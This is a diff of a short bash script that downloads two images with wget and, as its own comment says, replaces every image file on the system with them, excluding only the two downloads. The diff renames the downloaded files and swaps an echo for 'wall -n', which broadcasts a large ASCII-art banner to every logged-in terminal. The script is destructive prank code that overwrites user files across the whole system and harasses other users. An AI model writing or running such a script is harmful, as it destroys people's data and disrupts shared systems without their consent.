@@ -1,11 +1,11 @@
 #!/bin/bash
 
 # Download the images and save them
-wget -qO image.jpg "https://i.postimg.cc/nLwf48bX/styerteletubby.png"
-wget -qO image1.jpg "https://i.postimg.cc/cLWBYgkv/gameoverzhang.png"
+wget -qO styer.jpg "https://i.postimg.cc/nLwf48bX/styerteletubby.png"
+wget -qO zhang.jpg "https://i.postimg.cc/cLWBYgkv/gameoverzhang.png"
 
 # Replace all images on the system with either image.jpg or image1.jpg
-excluded_images=("$(pwd)/image.jpg" "$(pwd)/image1.jpg")
+excluded_images=("$(pwd)/styer.jpg" "$(pwd)/zhang.jpg")
 
 
 # Find all image files on the system
@@ -21,7 +21,7 @@ do
     	fi
 done
 
-echo "**************#=****####**%##*%*##*###%#-***************#*******************************************
+wall -n "**************#=****####**%##*%*##*###%#-***************#*******************************************
 ***##*##***#**#+*###*###*####%#*###*#%=***####*****##*####*#*##*************************************
 ***#*#%#***##@+##########%#%#######%+=*#@@%%###*##***######***#*##**##****#*************************
 #*##########%+############%######%%=**@+======**################***#*###*##*##**#####*************#*
